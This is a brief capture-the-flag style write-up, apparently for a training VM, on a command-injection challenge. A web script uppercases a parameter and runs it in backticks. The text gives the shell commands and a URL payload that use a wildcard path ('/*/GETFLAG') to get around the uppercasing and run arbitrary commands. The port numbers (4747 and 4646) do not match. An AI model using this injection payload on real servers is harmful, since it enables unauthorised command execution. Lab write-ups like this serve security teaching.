The script is executed on a web server at VM_IP:4747.
It modifies the xx parameter so that the output will be in upercase and remove everything after a whitepace.
After it a shell command is executed with backsticks.
We can send a request that executed our script.

$> echo "getflag > /tmp/output" > /tmp/GETFLAG

We can't specify the right path due to string modification but we can use wildcard exploit.

http://VM_IP:4646/?x="`/*/GETFLAG`"

$> cat /tmp/output
